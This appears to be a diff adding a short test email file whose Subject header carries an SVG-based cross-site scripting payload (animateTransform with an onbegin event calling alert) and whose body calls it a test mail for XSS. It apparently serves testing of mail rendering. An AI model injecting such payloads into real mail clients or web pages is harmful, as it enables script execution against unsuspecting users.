@@ -1,0 +1,7 @@
+From: "Aegis Capital Group LLC" <Jeri.Dow@free.fr>
+To: becky.spencer@enron.com, stacy.dickson@enron.com
+Subject: svg><animateTransform attributeName=transform onbegin=alert(2)>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
